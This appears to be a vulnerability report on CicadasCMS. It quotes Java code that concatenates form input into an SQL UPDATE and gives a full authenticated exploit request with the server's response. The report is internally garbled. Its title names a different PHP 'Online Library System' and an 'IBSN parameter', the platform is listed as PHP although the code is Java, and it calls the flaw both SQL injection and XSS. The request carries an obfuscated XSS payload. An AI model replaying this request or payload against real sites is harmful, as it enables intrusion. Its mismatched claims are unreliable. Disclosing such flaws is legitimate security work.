Online Library System - SQL Injection on (admin/books/controller.php IBSN parameter) 

Vendor Homepage:
```
https://gitee.com/westboy/CicadasCMS/branches
```

Version: 

```
V1.0
```

Tested on: 

```
PHP, Apache, MySQL
```

Affected Page:

```
src/main/java/com/zhiliao/module/web/cms/service/impl/ContentServiceImpl.java
```

On this page, IBSN parameter is vulnerable to Cross Site Scripting

```
exeSql = "UPDATE t_cms_content_" + tableName.trim() + " set ";
                      /*遍历Map保存扩展数据表,代码有些复杂*/
                for (TCmsModelFiled filed : cmsModelFileds) {
                    if(CmsUtil.isNullOrEmpty(formParam.get(filed.getFiledName()))) continue;
                    exeSql += "`" + filed.getFiledName() + "`";
                    if (formParam.get(filed.getFiledName()) instanceof Integer) {
                        exeSql += "=" + formParam.get(filed.getFiledName()) + ", ";
                    } else if (!CmsUtil.isNullOrEmpty(formParam.get(filed.getFiledName())) && formParam.get(filed.getFiledName()).getClass().isArray()) {
                    /*遍历字符数组，数组来源为checkbox和多图上传*/
                        String[] result = (String[]) formParam.get(filed.getFiledName());
                        if (result != null) {
                            String tmp = "";
                            for (String value : result) {
                                tmp += value + "#";
                            }
                            exeSql += "='" + tmp.substring(0, tmp.length() - 1) + "', ";
                        }
                    } else {
                        exeSql += "='" + formParam.get(filed.getFiledName()) + "', ";
                    }
```

Proof of vulnerability(Verify using the sqlmap tool after logining):

Request:

```
POST /system/cms/content/save HTTP/1.1
Host: 172.16.78.31
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 823
Origin: http://172.16.78.31
Connection: keep-alive
Referer: http://172.16.78.31/system
Cookie: bjui_theme=blue; SESSION=9ffd5bd4-6234-4223-83b4-4e34ad6c959c
Priority: u=0

contentId=124415&userId=1&siteId=1&tableName=&status=1&title=%E6%B5%8B%E8%AF%95%E6%B5%8B%E8%AF%95&keywords=%E6%B5%8B%E8%AF%95%E6%B5%8B%E8%AF%95%E6%B5%8B%E8%AF%95%E6%B5%8B%E8%AF%95%E6%B5%8B%E8%AF%95%E6%B5%8B%E8%AF%95&description=%E6%B5%8B%E8%AF%95%E6%B5%8B%E8%AF%95%E6%B5%8B%E8%AF%95%E6%B5%8B%E8%AF%95%E6%B5%8B%E8%AF%95%E6%B5%8B%E8%AF%95&categoryId=209&thumb=%2Fres%2F058940bd2cb74efba98f23761e3b1c7b.png&url=http%3A%2F%2Fwww.xgwy.cn%2Fupload%2Febook%2F2019%2F1%2F27%2F2f4fe04e040a43c29de001dcf4337cd5%2Findex.html&viewNum=14&author=admin&tags=&content=%3Cp%3E%3Ca+href%3D%22%2Fres%2F8512b0fce84442938c4c7aa33fa7e26a.pdf%22%3E%E6%B5%8B%E8%AF%95%3C%2Fa%3E%3C%2Fp%3E%0D%0A%3Cdetails+open+ontoggle%3Dtop%5B%60ale%60%2B%60rt%60%5D(1)%3E&fujian=%2Fres%2F8512b0fce84442938c4c7aa33fa7e26a.pdf&laiyuan=XXX%E5%B8%82%E6%96%87%E8%81%94
```

Response:

```
HTTP/1.1 200 
Content-Type: application/json;charset=UTF-8
Content-Length: 109
Date: Tue, 16 Sep 2025 08:16:52 GMT

{"tabid":"","forward":"","message":"操作成功","closeCurrent":true,"forwardConfirm":"","statusCode":"200"}
```
